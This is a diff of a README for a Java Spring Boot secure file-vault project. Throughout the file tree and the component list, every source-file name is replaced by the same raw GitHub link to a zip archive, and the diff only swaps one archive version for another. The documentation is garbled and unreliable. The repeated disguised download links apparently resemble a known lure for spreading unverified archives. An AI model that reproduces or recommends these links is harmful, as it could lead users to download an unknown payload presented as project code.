@@ -28,43 +28,43 @@ IroncladVaultManagementSystem/
 │   │   ├── java/
 │   │   │   └── com/java/IroncladVaultManagementSystem/
 │   │   │       ├── config/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       ├── controller/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       ├── dto/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       ├── model/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       ├── repository/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       ├── service/
-│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │       │   ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│   │   │       │   └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   │       └── util/
-│   │   │           └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │   │           └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │   └── resources/
-│   │       ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│   │       ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 │   │       ├── static/        # Static resources (css, js, images)
 │   │       └── templates/     # Thymeleaf HTML templates
 │   └── test/
 │       └── java/
 │           └── com/java/IroncladVaultManagementSystem/
-│               ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
-│               └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip
+│               ├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
+│               └── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip
 ├── vault_storage/               # Folder to store encrypted files
-├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip                      # Maven project descriptor
-└── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip                    # Project documentation
+├── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip                      # Maven project descriptor
+└── https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip                    # Project documentation
 ```
 
 🛠️ Technology Stack
@@ -166,27 +166,27 @@ Each action is logged in AuditLog
 Role-based security controls access to endpoints dynamically
 
 Repositories (Data Access):
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for finding users by username.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for querying files by owner, name, etc.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Extends JpaRepository; methods for querying logs by user.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Extends JpaRepository; methods for finding users by username.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Extends JpaRepository; methods for querying files by owner, name, etc.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Extends JpaRepository; methods for querying logs by user.
 Services (Business Logic):
 
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Handles user auth; implements UserDetailsService, password encoding, user saving/loading.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Core file operations; encrypts/decrypts files using AES, manages storage, logs actions.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Handles user auth; implements UserDetailsService, password encoding, user saving/loading.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Core file operations; encrypts/decrypts files using AES, manages storage, logs actions.
 
 Config (Security & Utils):
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Configures Spring Security; disables CSRF, permits auth endpoints, adds JWT filter.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip JWT token generation/validation; extracts claims, handles expiration.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Intercepts requests; validates JWT, sets authentication context.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Bean for BCrypt password encoder.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Configures Spring Security; disables CSRF, permits auth endpoints, adds JWT filter.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip JWT token generation/validation; extracts claims, handles expiration.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Intercepts requests; validates JWT, sets authentication context.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Bean for BCrypt password encoder.
 
 DTOs (Data Transfer Objects):
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For login requests; fields: username, password.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For login responses; fields: token.
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip For file listings; fields: id, filename, uploadedBy, uploadTime.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip For login requests; fields: username, password.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip For login responses; fields: token.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip For file listings; fields: id, filename, uploadedBy, uploadTime.
 Util:
 
-https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/Secure-Vault-System-Ironclad-Management-3.2-alpha.5.zip Encryption utilities; generates AES keys, encrypts/decrypts data.
+https://github.com/HarshalNakade2004/Ironclad-Secure--Vault-Management-System/raw/refs/heads/main/src/main/java/com/java/Ironclad-Vault-Management-Secure-System-v3.9.zip Encryption utilities; generates AES keys, encrypts/decrypts data.
 
 🧑‍💻 Roles and Access Control
 | Role    | Upload | View All Files | Download  | Delete | Search    | View Audit Logs |
